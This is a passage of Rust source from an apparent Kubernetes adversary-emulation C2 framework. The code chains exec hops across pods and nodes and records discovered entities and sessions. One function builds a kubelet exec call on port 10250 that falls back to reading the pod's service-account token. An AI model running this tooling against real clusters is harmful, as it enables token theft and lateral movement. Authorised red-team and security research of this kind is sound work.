        // out; reversed and prefixed with the C2 entry hop before returning.
        let mut traversal: Vec<TraversalHop> = Vec::new();
        let mut inner_command = String::new();

        // Wrap from innermost (last pair) to outermost (second pair;
        // hops[0] is handled by BuiltinC2 itself).
        for i in (1..full_chain.len()).rev() {
            let src = full_chain[i - 1];
            let tgt = full_chain[i];

            // Ground all command-name occurrences in the inner command against
            // the target system's binary map before embedding it in the envelope.
            if let Some(sys) = self.get_system_entity(tgt) {
                procedure.command =
                    ground_binaries(&procedure.command, &sys.entity().system().binaries);
            }

            // The first iteration handles the innermost pair; the freshly
            // grounded command is what physically runs on the final target.
            if i == full_chain.len() - 1 {
                inner_command = procedure.command.clone();
            }

            let src_eid = EntityId::new(src);
            let tgt_eid_inner = EntityId::new(tgt);
            let found = self
                .graph
                .outgoing(&src_eid)
                .into_iter()
                .find(|(t, d)| *t == &tgt_eid_inner && d.is_exec_channel)
                .map(|(t, d)| ran_domain::RelationSummary {
                    name: d.relation_name.clone(),
                    source_id: src.to_string(),
                    target_id: t.0.clone(),
                    is_exec_channel: true,
                    envelope: d.envelope.clone(),
                    output_transform: d.output_transform.clone(),
                    weight: d.weight,
                    session_id: d.session_id.clone(),
                    broken: d.broken,
                });
            // Capture the relation name and envelope template for this hop
            // before the match consumes `found` to rewrite the command.
            let hop_relation = found
                .as_ref()
                .map(|r| r.name.clone())
                .unwrap_or_else(|| "kubectl-exec".to_string());
            let hop_envelope = found.as_ref().and_then(|r| r.envelope.clone());
            procedure.command = match found {
                Some(ref rel) => {
                    if let Some(ref transform) = rel.output_transform {
                        output_transform = Some(transform.clone());
                    }

                    // For chained kubelet routing (pod -> node via kubelet-exec
                    // envelope, then node -> pod via kubelet-pod-exec), the
                    // sink hop is structural: the outer envelope already executes
                    // the inner command inside the final pod. Wrapping the sink
                    // with RelationSummary::wrap_command would fall back to
                    // `kubectl exec ...` (because kubelet-pod-exec has no
                    // envelope), causing token reads to run with a missing
                    // kubectl binary in the target pod.
                    if rel.name == "kubelet-pod-exec" && rel.envelope.is_none() && i > 1 {
                        let outer_src = full_chain[i - 2];
                        let outer_rel_has_envelope = self
                            .graph
                            .outgoing(&EntityId::new(outer_src))
                            .into_iter()
                            .find(|(t, d)| *t == &src_eid && d.is_exec_channel)
                            .and_then(|(_, d)| d.envelope.clone())
                            .is_some();

                        if outer_rel_has_envelope {
                            // Modern channel edges with envelope metadata on the
                            // outer kubelet hop can pass the command through.
                            procedure.command.clone()
                        } else if let Some(cmd) =
                            self.build_kubelet_exec_command(src, tgt, &procedure.command, args)
                        {
                            output_transform = Some(OutputTransform::JsonEnvelope);
                            cmd
                        } else {
                            procedure.command.clone()
                        }
                    } else {
                        rel.wrap_command(&procedure.command)
                    }
                }
                None => {
                    // Fallback: try kubectl exec via target entity ID.
                    if let Some((ns, name)) = split_pod_entity_id(tgt) {
                        format!("kubectl exec -n {} {} -- {}", ns, name, procedure.command)
                    } else {
                        procedure.command.clone()
                    }
                }
            };

            // After wrapping, ground the outer tool (first word of the wrapped
            // command) against the source system's binary map.
            if let Some(sys) = self.get_system_entity(src) {
                procedure.command =
                    ground_binary_in_cmd(&procedure.command, &sys.entity().system().binaries);
            }

            // Record this hop with the command `src` runs to reach `tgt`. The
            // snapshot is taken before any outer layer wraps it further.
            traversal.push(TraversalHop {
                from_id: src.to_string(),
                to_id: tgt.to_string(),
                relation: hop_relation,
                envelope: hop_envelope,
                command: procedure.command.clone(),
            });
        }

        // Loop recorded the system-to-system hops innermost-first; flip to
        // outermost-first so the timeline reads first-system → … → target. The
        // C2 entry hop (C2 → first system) is prepended later, uniformly for
        // both direct and multi-hop commands, in `build_command_traversal`.
        traversal.reverse();

        HopWrap {
            output_transform,
            traversal,
            inner_command,
        }
    }

    /// Build a direct ran-ws kubelet exec command for `node -> pod` sink hops.
    ///
    /// Used as a compatibility fallback when historical graph edges lack
    /// envelope metadata on `kubelet-exec` relations.
    fn build_kubelet_exec_command(
        &self,
        node_id: &str,
        pod_id: &str,
        inner_cmd: &str,
        args: &HashMap<String, String>,
    ) -> Option<String> {
        let (namespace, pod_name) = split_pod_entity_id(pod_id)?;
        let node_host = self
            .preferred_kubelet_host(node_id, pod_id, args)
            .unwrap_or_else(|| node_id.strip_prefix("node/").unwrap_or(node_id).to_string());

        let container = self
            .entities
            .find::<Pod>(&EntityId::new(pod_id))
            .and_then(|p| p.containers.first().map(|c| c.name.clone()))
            .filter(|name| !name.trim().is_empty())
            .unwrap_or_else(|| "main".to_string());

        let encoded_cmd = urlencoding::encode(inner_cmd);
        let url = format!(
            "wss://{}:10250/exec/{}/{}/{}?output=1&error=1&command={}",
            node_host, namespace, pod_name, container, encoded_cmd
        );

        let mut cmd = format!("ran-ws --url {}", shell_words::quote(&url));

        if let Some(token) = args
            .get("TOKEN")
            .map(|t| t.trim())
            .filter(|t| !t.is_empty() && !t.contains("${"))
        {
            cmd.push_str(&format!(" --token {}", shell_words::quote(token)));
        } else {
            // Compatibility fallback: when TOKEN is not grounded yet, use the
            // currently executing pod's mounted service-account token.
            cmd.push_str(" --token \"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\"");
        }

        Some(cmd)
    }

    fn preferred_kubelet_host(
        &self,
        node_id: &str,
        pod_id: &str,
        args: &HashMap<String, String>,
    ) -> Option<String> {
        if let Some(host_ip) = self
            .get_system_entity(pod_id)
            .and_then(|entity| match entity {
                CampaignSystemEntityRef::Pod(pod) => pod.host_ip.map(|ip| ip.to_string()),
                _ => None,
            })
        {
            return Some(host_ip);
        }

        if let Some(node_ip) = args
            .get("NODE.IP")
            .map(|v| v.trim())
            .filter(|v| !v.is_empty() && !v.contains("${"))
        {
            return Some(node_ip.to_string());
        }

        if let Some(node_host) = args
            .get("NODE")
            .map(|v| v.trim())
            .filter(|v| !v.is_empty() && !v.contains("${"))
        {
            return Some(node_host.to_string());
        }

        self.preferred_node_endpoint(node_id)
    }

    fn preferred_node_endpoint(&self, node_id: &str) -> Option<String> {
        let bare = node_id.strip_prefix("node/").unwrap_or(node_id).trim();

        let mut candidates = vec![node_id.to_string()];
        if !bare.is_empty() {
            let prefixed = format!("node/{}", bare);
            if prefixed != node_id {
                candidates.push(prefixed);
            }
        }

        for candidate in candidates {
            if let Some(CampaignSystemEntityRef::Node(node)) = self.get_system_entity(&candidate) {
                if let Some(ip) = node.system.ips.first() {
                    return Some(ip.to_string());
                }
                if !node.name.trim().is_empty() {
                    return Some(node.name.clone());
                }
            }
        }

        if bare.is_empty() {
            None
        } else {
            Some(bare.to_string())
        }
    }

    /// Commit facts that an effect explicitly declares safe to parse before
    /// command completion. Final result parsing remains authoritative and will
    /// enrich or reconcile these observations when the action finishes.
    pub(crate) fn apply_incremental_output(&mut self, cmd_id: &str) -> Option<FactsUpdate> {
        let cmd = self
            .open_steps
            .iter()
            .find(|step| step.id == cmd_id)?
            .clone();
        let stdout = self.in_flight_outputs.get(cmd_id)?.stdout.clone();

        let mut updates = FactsUpdate::default();
        for effect in &cmd.ttp.effects {
            if let Some(parsed) = parse_incremental_output_effect(effect, &cmd, &stdout) {
                updates.merge(parsed);
            }
        }

        // Incremental parsers emit monotonic observations. Suppress facts that
        // this or an earlier output batch already committed so the timeline and
        // graph do not churn on every 250 ms transport batch.
        updates.new_entities.retain(|entity| {
            let canonical = EntityId::new(self.canonical_entity_id(&entity.entity_id().0));
            !self.entities.contains_id(&canonical)
        });
        updates.new_relations.retain(|relation| {
            let source = EntityId::new(self.canonical_entity_id(&relation.source_id().0));
            let target = EntityId::new(self.canonical_entity_id(&relation.target_id().0));
            !self
                .graph
                .targets_of(&source, relation.relation_name())
                .iter()
                .any(|existing| **existing == target)
        });

        if updates.new_entities.is_empty()
            && updates.new_relations.is_empty()
            && updates.entity_aliases.is_empty()
            && updates.removed_entities.is_empty()
        {
            return None;
        }

        updates.attribute_unattributed(crate::KnowledgeProvenance::Action);
        updates.resolve_outcomes(|id| self.entities.contains_id(id));
        self.apply_facts(&updates);
        Some(updates)
    }

    pub fn on_ttp_executed(
        &mut self,
        cmd: &ExecTtp,
        event: &TtpExecuted,
    ) -> Result<TtpExecutionProcessing, ExecuteActionError> {
        let mut updates = FactsUpdate::default();
        let mut parse_audits = Vec::new();

        // If the channel wrapped its output (e.g. ran-ws JSON envelope from kubelet-pod-exec),
        // unwrap it here before any parser sees the result.
        let event_owned;
        let event: &TtpExecuted = if cmd.output_transform == Some(OutputTransform::JsonEnvelope)
            && event.success
            && !event.results.is_empty()
        {
            let raw = &event.results[0];
            let (unwrapped, err) = crate::output_parsers::unwrap_kubelet_json_response(raw);
            let mut patched = event.clone();
            patched.results[0] = unwrapped;
            if let Some(msg) = err {
                patched.success = false;
                patched.fail_reason = msg;
            }
            event_owned = patched;
            &event_owned
        } else {
            event
        };

        if !event.success {
            let classified = classify_failure(cmd, event);
            parse_audits.push(build_parse_audit(
                FAILURE_ANALYZER_EFFECT_ID,
                cmd,
                event,
                classified.parse_result,
                &classified.detail,
                0,
            ));

            // If the binary was not found, record it as Absent in the system's
            // binary map so the procedure selector can automatically fall back to
            // an alternative procedure next time.
            //
            // Prefer the name extracted from the error output (more reliable when
            // the procedure runs a wrapper that calls a different binary), then
            // fall back to the procedure's declared tool name.
            if classified.is_binary_missing {
                let binary = classified
                    .extracted_binary
                    .as_deref()
                    .or_else(|| procedure_binary_name(&cmd.procedure));

                if let Some(binary) = binary {
                    let system_id = cmd
                        .exec_chain
                        .iter()
                        .rev()
                        .map(String::as_str)
                        .find(|id| self.get_system_entity(id).is_some())
                        .or_else(|| {
                            let target_id_arg =
                                cmd.args.get("TARGET_ID").map(String::as_str).unwrap_or("");
                            self.get_system_entity(target_id_arg).map(|_| target_id_arg)
                        })
                        .or_else(|| {
                            self.get_system_entity(&cmd.target_id)
                                .map(|_| cmd.target_id.as_str())
                        });
                    if let Some(id) = system_id {
                        // Empty path → BinaryPresence::Absent; only written when
                        // currently Unknown (apply_system_update's existing guard).
                        let absent_update = SystemFieldUpdates {
                            binaries: std::collections::HashMap::from([(
                                binary.to_string(),
                                String::new(),
                            )]),
                            ..Default::default()
                        };
                        let _ = self.apply_system_update(id, &absent_update);
                    }
                }
            }

            self.parse_audits.extend(parse_audits.clone());
            self.execution_records
                .push(ExecutionRecord::from_execution(cmd, event));
            self.complete_open_step(&cmd.id);
            return Ok(TtpExecutionProcessing {
                updates,
                parse_audits,
                effective_success: false,
                effective_fail_reason: event.fail_reason.clone(),
            });
        }

        // Some transports report success even when the command failed and
        // emitted a recognizable error on stdout/stderr. Detect that before
        // inference so a failed exploit cannot create an execution edge.
        if let Some(early_failure) = detect_failure_signature(cmd, event) {
            if early_failure.is_binary_missing {
                let binary = early_failure
                    .extracted_binary
                    .as_deref()
                    .or_else(|| procedure_binary_name(&cmd.procedure));
                if let Some(binary) = binary {
                    let system_id = cmd
                        .exec_chain
                        .iter()
                        .rev()
                        .map(String::as_str)
                        .find(|id| self.get_system_entity(id).is_some())
                        .or_else(|| {
                            let target_id_arg =
                                cmd.args.get("TARGET_ID").map(String::as_str).unwrap_or("");
                            self.get_system_entity(target_id_arg).map(|_| target_id_arg)
                        })
                        .or_else(|| {
                            self.get_system_entity(&cmd.target_id)
                                .map(|_| cmd.target_id.as_str())
                        });
                    if let Some(id) = system_id {
                        let absent_update = SystemFieldUpdates {
                            binaries: std::collections::HashMap::from([(
                                binary.to_string(),
                                String::new(),
                            )]),
                            ..Default::default()
                        };
                        let _ = self.apply_system_update(id, &absent_update);
                    }
                }
            }
            let parse_audits = vec![build_parse_audit(
                FAILURE_ANALYZER_EFFECT_ID,
                cmd,
                event,
                early_failure.parse_result,
                &early_failure.detail,
                0,
            )];
            self.parse_audits.extend(parse_audits.clone());
            let mut record = ExecutionRecord::from_execution(cmd, event);
            record.success = false;
            record.fail_reason = early_failure.detail.clone();
            self.execution_records.push(record);
            self.complete_open_step(&cmd.id);
            return Ok(TtpExecutionProcessing {
                updates: FactsUpdate::default(),
                parse_audits,
                effective_success: false,
                effective_fail_reason: early_failure.detail,
            });
        }

        // Build the effect-parsing context: start with the TTP args and add
        // PROCEDURE_CMD so relation-effect handlers (e.g. rce.can-exec) that
        // need the executed command template can read it without special-casing.
        // TARGET_ID resolves the `sys` placeholder used in relation effects like
        // `k8s.kubelet-exec(sys, all(k8s.Node))` to the actual executing entity.
        let mut effect_ctx = cmd.args.clone();
        effect_ctx
            .entry("PROCEDURE_CMD".to_string())
            .or_insert_with(|| cmd.procedure.command.clone());
        effect_ctx
            .entry("TARGET_ID".to_string())
            .or_insert_with(|| cmd.target_id.clone());
        // TARGET_NODE_ID is the entity ID of the node the executing pod runs on.
        // Used by kubelet-exec and container.escape effects.
        // Resolution order:
        //   1. pod.node_name (set when the pod was parsed from the K8s API)
        //   2. runs-on graph edge from the pod (set when a RunsOn relation exists)
        if let Some(CampaignSystemEntityRef::Pod(pod)) = self.get_system_entity(&cmd.target_id) {
            let from_node_name = pod.node_name.is_some();
            let node_id = pod
                .node_name
                .as_ref()
                .map(|n| format!("node/{}", n))
                .or_else(|| {
                    let target_eid = EntityId::new(&cmd.target_id);
                    self.graph
                        .targets_of(&target_eid, ran_domain::RunsOn::RELATION_NAME)
                        .first()
                        .map(|n| n.0.clone())
                });
            if let Some(node_id) = node_id {
                effect_ctx
                    .entry("TARGET_NODE_ID".to_string())
                    .or_insert(node_id);
                if from_node_name {
                    effect_ctx
                        .entry("TARGET_NODE_AUTHORITATIVE".to_string())
                        .or_insert_with(|| "true".to_string());
                }
            }
        }

        for effect in &cmd.ttp.effects {
            if let Some(parsed_output) = parse_output_effect(self, effect, cmd, event) {
                updates.merge(parsed_output.updates);
                parse_audits.push(parsed_output.audit);
                continue;
            }

            match parse_effect_with_status(effect, &effect_ctx) {
                Ok(parsed_structural) if parsed_structural.handled => {
                    updates.merge(parsed_structural.updates);
                    parse_audits.push(build_parse_audit(
                        effect,
                        cmd,
                        event,
                        ParseResult::Parsed,
                        "parsed by structural effect handler",
                        0,
                    ));
                }
                Ok(_) => {
                    parse_audits.push(build_no_parser_audit(effect, cmd, event));
                }
                Err(err) => {
                    parse_audits.push(build_parse_audit(
                        effect,
                        cmd,
                        event,
                        ParseResult::ParserBug,
                        &err,
                        0,
                    ));
                }
            }
        }

        // Record binary presence before running the fixpoint so that rules like
        // KubeletExecSourceRule can see the updated binary map in campaign state.
        // Only records if currently Unknown - preserves more precise paths set by
        // sys.has-binary(${OUTPUT}) or from a real parser.
        if let Some(tool) = procedure_tool(&cmd.procedure) {
            let system_id = cmd
                .exec_chain
                .iter()
                .rev()
                .map(String::as_str)
                .find(|id| self.get_system_entity(id).is_some())
                .or_else(|| {
                    self.get_system_entity(&cmd.target_id)
                        .map(|_| cmd.target_id.as_str())
                });

            if let Some(id) = system_id {
                let already_known = self
                    .get_system_entity(id)
                    .map(|e| e.entity().system().has_binary(tool) != BinaryPresence::Unknown)
                    .unwrap_or(false);

                if !already_known {
                    let binary_updates = SystemFieldUpdates {
                        binaries: std::collections::HashMap::from([(
                            tool.to_string(),
                            tool.to_string(),
                        )]),
                        ..Default::default()
                    };
                    let _ = self.apply_system_update(id, &binary_updates);
                }
            }
        }

        // A successful command execution on a pod is direct evidence that the
        // pod is currently running. Emit an in-flight pod update before the
        // rule fixpoint so `KubeletExecSourceRule` can qualify it.
        let exec_system_id = cmd
            .exec_chain
            .iter()
            .rev()
            .map(String::as_str)
            .find(|id| self.get_system_entity(id).is_some())
            .or_else(|| {
                self.get_system_entity(&cmd.target_id)
                    .map(|_| cmd.target_id.as_str())
            });

        if let Some(system_id) = exec_system_id {
            if let Some(CampaignSystemEntityRef::Pod(pod)) = self.get_system_entity(system_id) {
                if !pod.is_running {
                    let mut running_pod = pod.clone();
                    running_pod.is_running = true;
                    updates.new_entities.push(Box::new(running_pod));
                }
            }
        }

        // Detect when a TTP ran against an IP-placeholder pod and the output
        // revealed the real pod identity (e.g. via a service-account token).
        // Record the alias so apply_facts can transplant all relations.
        self.detect_pod_identity_merge(cmd, &mut updates);

        updates.attribute_unattributed(crate::KnowledgeProvenance::Action);
        let rules = default_rules();
        updates = run_rules_fixpoint(self, &rules, updates);

        // Settle observed/created/updated while the campaign still reflects the
        // state *before* this execution — `apply_facts` inserts, after which
        // every entity looks like one we already knew.
        updates.resolve_outcomes(|id| self.entities.contains_id(id));

        self.apply_facts(&updates);
        self.parse_audits.extend(parse_audits.clone());

        // If a parser detected a semantic failure inside an otherwise-successful
        // transport response (e.g. Kubernetes API 403 Forbidden returned as HTTP
        // 200 with a Status body), override the recorded success flag so the
        // audit log and /api/flow reflect the real outcome.
        let api_error = parse_audits.iter().find(|a| {
            matches!(a.parse_result, ParseResult::KnownFailure)
                && a.detail.starts_with("K8s API error ")
        });
        let mut record = ExecutionRecord::from_execution(cmd, event);
        record.discovered_entities = updates
            .new_entities
            .iter()
            .map(|entity| crate::ExecutionEntity {
                id: entity.entity_id().to_string(),
                name: entity.entity_name().to_string(),
                kind: entity.entity_kind().to_string(),
                outcome: updates.outcome_of(&entity.entity_id()),
                // Effect facts are classified by kind; session attachment does
                // not travel this path (it publishes its own FactsChanged).
                category: crate::FactCategory::from_kind(entity.entity_kind()),
            })
            .collect();
        let (effective_success, effective_fail_reason) = if let Some(err_audit) = api_error {
            record.success = false;
            record.fail_reason = err_audit.detail.clone();
            (false, err_audit.detail.clone())
        } else {
            (event.success, event.fail_reason.clone())
        };
        self.execution_records.push(record);
        self.complete_open_step(&cmd.id);

        Ok(TtpExecutionProcessing {
            updates,
            parse_audits,
            effective_success,
            effective_fail_reason,
        })
    }

    pub fn execute_action(
        &mut self,
        request: ExecuteActionRequest,
        armory: &Armory,
    ) -> Result<ExecuteActionResult, ExecuteActionError> {
        let exec = self.prepare_action(request, armory)?;
        Ok(ExecuteActionResult {
            cmd_id: exec.id.clone(),
            event: ExecutedActionEvent {
                id: exec.id.clone(),
                cmd_id: exec.id,
                ttp: exec.ttp,
                args: exec.args,
                exec_system_id: exec.exec_system_id,
                success: true,
                fail_reason: String::new(),
            },
        })
    }

    /// Commit an inferred fact set into campaign state: entities, entity
    /// aliases and their graph edges.
    ///
    /// `pub(crate)` so tests can drive a fixpoint result into the graph
    /// without staging a whole TTP execution.
    pub(crate) fn apply_facts(&mut self, updates: &FactsUpdate) {
        for entity in &updates.new_entities {
            self.insert_entity(entity.as_ref());
            if let Some(origins) = updates.entity_provenance.get(&entity.entity_id()) {
                for origin in origins {
                    self.knowledge_provenance
                        .add_entity(entity.entity_id(), *origin);
                }
            }
        }

        // Merge entity aliases: transplant graph edges and entity data.
        // Runs after insert_entity so the preferred node already exists.
        for (stale_id, preferred_id) in &updates.entity_aliases {
            // Graph: retarget all edges from stale → preferred.
            self.graph.merge_entities(preferred_id, stale_id);
            self.knowledge_provenance
                .merge_entity(stale_id, preferred_id);
            // Remember the rename: callers holding the old id (C2 session
            // bookkeeping above all) must still reach the surviving entity.
            self.record_entity_alias(stale_id, preferred_id);
            // Entity maps: merge runtime data (IPs, access level, binaries, etc.).
            // Dispatch to the correct merge function based on entity kind.
            if stale_id.0.starts_with("system/") {
                // UnknownSystem → Pod or Node cross-type merge.
                self.merge_unknown_into_system(&preferred_id.0, &stale_id.0);
            } else if preferred_id.0.starts_with("node/") || stale_id.0.starts_with("node/") {
                self.merge_node_entities(&preferred_id.0, &stale_id.0);
            } else if preferred_id.0.starts_with("k8s/cluster/")
                || stale_id.0.starts_with("k8s/cluster/")
            {
                self.merge_cluster_entities(&preferred_id.0, &stale_id.0);
            } else if stale_id.0.contains("/svc/") {
                // Env-derived Service placed into its real namespace.
                self.merge_service_entities(&preferred_id.0, &stale_id.0);
            } else {
                self.merge_pod_entities(&preferred_id.0, &stale_id.0);
            }
        }

        for rel in &updates.new_relations {
            // Resolve stale entity IDs before inserting into the graph.
            let (src, tgt) = updates.entity_aliases.iter().fold(
                (rel.source_id().clone(), rel.target_id().clone()),
                |(src, tgt), (stale, preferred)| {
                    let src = if src == *stale {
                        preferred.clone()
                    } else {
                        src
                    };
                    let tgt = if tgt == *stale {
                        preferred.clone()
                    } else {
                        tgt
                    };
                    (src, tgt)
                },
            );

            // runs-on: when the new node differs, pick the preferred one and
            // merge the stale node entity into it.
            if rel.relation_name() == "runs-on" {
                let existing_node = self
                    .graph
                    .targets_of(&src, "runs-on")
                    .first()
                    .cloned()
                    .cloned();

                if let Some(old_node) = existing_node {
                    if old_node != tgt {
                        // Prefer the node whose name is Authoritative; fall back to
                        // keeping the existing node when both have equal confidence.
                        let old_confidence = self
                            .entities
                            .find::<K8sNode>(&old_node)
                            .map(|n| n.name_confidence)
                            .unwrap_or(NameConfidence::Derived);
                        let tgt_confidence = self
                            .entities
                            .find::<K8sNode>(&tgt)
                            .map(|n| n.name_confidence)
                            .unwrap_or(NameConfidence::Derived);
                        let preferred_node = if tgt_confidence == NameConfidence::Authoritative
                            && old_confidence != NameConfidence::Authoritative
                        {
                            tgt.clone()
                        } else {
                            old_node.clone()
                        };
                        let stale_node = if preferred_node == old_node {
                            tgt.clone()
                        } else {
                            old_node
                        };
                        self.graph.merge_entities(&preferred_node, &stale_node);
                        self.merge_node_entities(&preferred_node.0, &stale_node.0);
                        self.record_entity_alias(&stale_node, &preferred_node);
                        // Insert edge to preferred node (graph PodSingleNode
                        // invariant removes the old runs-on automatically).
                        self.insert_relation_with_ids(&src, &preferred_node, rel.as_ref());
                        self.apply_relation_provenance(
                            updates,
                            rel.as_ref(),
                            &src,
                            &preferred_node,
                        );
                        continue;
                    }
                    // Same node - nothing to do (PodSingleNode invariant will
                    // replace the edge anyway, but we skip the insert).
                    continue;
                }
            }

            // Common path: no alias resolution changed the IDs - use the
            // public `insert_relation` so it gets a live production call site.
            if src == *rel.source_id() && tgt == *rel.target_id() {
                self.insert_relation(rel.as_ref());
            } else {
                self.insert_relation_with_ids(&src, &tgt, rel.as_ref());
            }
            self.apply_relation_provenance(updates, rel.as_ref(), &src, &tgt);
        }

        for removed_id in &updates.removed_entities {
            let canonical_id = EntityId::new(self.canonical_entity_id(&removed_id.0));
            self.remove_entity_by_id(&canonical_id);
        }
    }

    fn apply_relation_provenance(
        &mut self,
        updates: &FactsUpdate,
        relation: &dyn ran_domain::Relation,
        source_id: &EntityId,
        target_id: &EntityId,
    ) {
        let original_key = crate::RelationProvenanceKey::from_relation(relation);
        if let Some(origins) = updates.relation_provenance.get(&original_key) {
            let effective_key = crate::RelationProvenanceKey::new(
                relation.relation_name(),
                source_id.0.clone(),
                target_id.0.clone(),
            );
            for origin in origins {
                self.knowledge_provenance
                    .add_relation(effective_key.clone(), *origin);
            }
        }
    }

    /// Insert a relation into the graph using explicit (possibly alias-resolved)
    /// source and target IDs rather than the relation's own stored IDs.
    pub(super) fn insert_relation_with_ids(
        &mut self,
        src: &EntityId,
        tgt: &EntityId,
        rel: &dyn ran_domain::Relation,
    ) {
        // An unqualified scan placeholder temporarily hangs directly off the
        // cluster. If that placeholder is merged into an authoritative Pod,
        // alias resolution can otherwise retarget the temporary relation to
        // the real Pod and replace its more specific namespace parent.
        if rel.relation_name() == "contains"
            && self.entities.find::<K8sCluster>(src).is_some()
            && self
                .entities
                .find::<Pod>(tgt)
                .and_then(Pod::namespace)
                .is_some_and(|namespace| !namespace.is_empty() && namespace != UNKNOWN_NAMESPACE)
        {
            return;
        }

        use cortex::edge_data_for;
        let summary = ran_domain::RelationSummary::from_relation(rel);
        let mut data = edge_data_for(
            rel.relation_name(),
            summary.envelope,
            summary.output_transform,
        );
        // Carry session state that lives on the relation but not in the
        // name-keyed `relation_defaults` table. Without this a standalone
        // `c2.session` edge (a reverse shell to an otherwise-unknown host) lands
        // with no `session_id`, so it can never be matched when its session
        // breaks - leaving a dead connection rendered as a live one. Upgrading
        // (never downgrading) `is_exec_channel` also makes a live shell a real
        // exec channel, so path-finding treats it as traversable while healthy
        // and skips it once broken.
        data.session_id = summary.session_id;
        if summary.is_exec_channel {
            data.is_exec_channel = true;
        }
        self.graph.insert_edge(src, tgt, data);

        // When a C2 channel relation is added to a system entity, ensure
        // access_level reflects at least Exec so the field stays consistent.
        if rel.is_exec_channel() {
            if let Some(pod) = self.entities.find_mut::<Pod>(tgt) {
                if pod.system.access_level == ran_domain::AccessLevel::None {
                    pod.system.access_level = ran_domain::AccessLevel::Exec;
                }
            }
            if let Some(node) = self.entities.find_mut::<K8sNode>(tgt) {
                if node.system.access_level == ran_domain::AccessLevel::None {
                    node.system.access_level = ran_domain::AccessLevel::Exec;
                }
            }
        }
    }

    fn merge_node_entities(&mut self, preferred_id: &str, stale_id: &str) {
        if preferred_id == stale_id {
            return;
        }

        let preferred = EntityId::new(preferred_id);
        let stale = EntityId::new(stale_id);

        let Some(stale_node) = self.entities.get_mut::<K8sNode>().remove(&stale) else {
            return;
        };

        if let Some(preferred_node) = self.entities.find_mut::<K8sNode>(&preferred) {
            preferred_node.merge_from(&stale_node);
        } else {
            self.entities
                .get_mut::<K8sNode>()
                .insert(preferred, stale_node);
        }
    }

    /// Merge a Service parked in the `"?"` namespace into the one that has a
    /// real namespace.
    ///
    /// Both describe the same ClusterIP (that is how
    /// `EnvServicePlacementAnalyzer` matched them), so the env-derived ports
    /// and any other accumulated detail are folded in and the placeholder slot
    /// is cleared.
    fn merge_service_entities(&mut self, preferred_id: &str, stale_id: &str) {
        if preferred_id == stale_id {
            return;
        }

        let preferred = EntityId::new(preferred_id);
        let stale = EntityId::new(stale_id);

        let Some(stale_svc) = self.entities.get_mut::<K8sService>().remove(&stale) else {
            return;
        };

        if let Some(preferred_svc) = self.entities.find_mut::<K8sService>(&preferred) {
            preferred_svc.merge_from(&stale_svc);
        } else {
            self.entities
                .get_mut::<K8sService>()
                .insert(preferred.clone(), stale_svc);
        }

        // While parked, the Service hung directly off the cluster because no
        // namespace could hold it. `merge_entities` above just transplanted
        // that edge onto the placed Service, which is about to get a real
        // `contains(namespace → service)` parent as well. Drop the cluster
        // edge so it has one parent, not two.
        let cluster_ids: Vec<EntityId> = self
            .entities
            .values::<K8sCluster>()
            .map(Entity::entity_id)
            .collect();
        for cluster_id in cluster_ids {
            self.graph.remove_edges(&cluster_id, &preferred, "contains");
        }
    }

    /// Merge a server-derived cluster placeholder into the named cluster that
    /// a later kubeconfig resolved for the same API endpoint.
    fn merge_cluster_entities(&mut self, preferred_id: &str, stale_id: &str) {
        if preferred_id == stale_id {
            return;
        }

        let preferred = EntityId::new(preferred_id);
        let stale = EntityId::new(stale_id);
        let Some(stale_cluster) = self.entities.get_mut::<K8sCluster>().remove(&stale) else {
            return;
        };

        if let Some(preferred_cluster) = self.entities.find_mut::<K8sCluster>(&preferred) {
            preferred_cluster.merge_from(&stale_cluster);
        } else {
            self.entities
                .get_mut::<K8sCluster>()
                .insert(preferred, stale_cluster);
        }
    }

    /// Merge a stale (placeholder) pod into the preferred (real-named) pod.
    ///
    /// All facts accumulated on the stale entity are folded into the preferred
    /// one via `Pod::merge_from`.  The stale entity is removed regardless.
    fn merge_pod_entities(&mut self, preferred_id: &str, stale_id: &str) {
        if preferred_id == stale_id {
            return;
        }

        let preferred = EntityId::new(preferred_id);
        let stale = EntityId::new(stale_id);

        let Some(stale_pod) = self.entities.get_mut::<Pod>().remove(&stale) else {
            return;
        };

        if let Some(preferred_pod) = self.entities.find_mut::<Pod>(&preferred) {
            preferred_pod.merge_from(&stale_pod);
        } else {
            // Preferred entity not yet in the campaign (shouldn't happen in the
            // normal flow, but handle gracefully by keeping the stale data).
            self.entities
                .get_mut::<Pod>()
                .insert(preferred.clone(), stale_pod);
        }

        let has_real_namespace = self
            .entities
            .find::<Pod>(&preferred)
            .and_then(Pod::namespace)
            .is_some_and(|namespace| !namespace.is_empty() && namespace != UNKNOWN_NAMESPACE);
        if has_real_namespace {
            let cluster_ids: Vec<EntityId> = self
                .entities
                .values::<K8sCluster>()
                .map(Entity::entity_id)
                .collect();
            for cluster_id in cluster_ids {
                self.graph.remove_edges(&cluster_id, &preferred, "contains");
            }
        }
    }

    /// Merge an `UnknownSystem` into its now-identified Pod or Node counterpart.
    ///
    /// Called when `IpBasedSystemMergeAnalyzer` matched the two by a shared IP.
    /// The stale `UnknownSystem`'s `SystemInfo` (IPs, binaries, access level,
    /// sessions, etc.) is folded into the preferred entity, then the
    /// `UnknownSystem` slot is cleared.
    fn merge_unknown_into_system(&mut self, preferred_id: &str, stale_id: &str) {
        if preferred_id == stale_id {
            return;
        }

        let stale = EntityId::new(stale_id);
        let preferred = EntityId::new(preferred_id);

        let Some(stale_unknown) = self.entities.get_mut::<UnknownSystem>().remove(&stale) else {
            return;
        };

        if preferred_id.starts_with("node/") {
            if let Some(node) = self.entities.find_mut::<K8sNode>(&preferred) {
                node.system.merge_from(&stale_unknown.system);
            }
        } else if let Some(pod) = self.entities.find_mut::<Pod>(&preferred) {
            pod.system.merge_from(&stale_unknown.system);
        }
    }

    /// Detect when a TTP ran against a derived-name pod and the output
    /// revealed the real pod identity (e.g. from a service-account token).
    ///
    /// A "derived-name" pod is one whose `name_confidence` is [`NameConfidence::Derived`] -
    /// for example a pod whose name was inferred from its IP address during a
    /// network scan.  When a subsequent TTP produces a `Pod` entity whose name
    /// is [`NameConfidence::Authoritative`] (e.g. from a service-account JWT),
    /// this function records an alias `(stale_id, preferred_id)` in `updates`
    /// so that `apply_facts` can transplant all relations to the real entity.
    fn detect_pod_identity_merge(&self, cmd: &ExecTtp, updates: &mut FactsUpdate) {
        // For multi-hop TTPs the C2 sets `cmd.target_id` to the first hop (the
        // pod it kubectl-execs into), NOT the logical target of the TTP.  The
        // original request target is always preserved in args["TARGET_ID"].
        let logical_target = cmd
            .args
            .get("TARGET_ID")
            .map(String::as_str)
            .unwrap_or(&cmd.target_id);

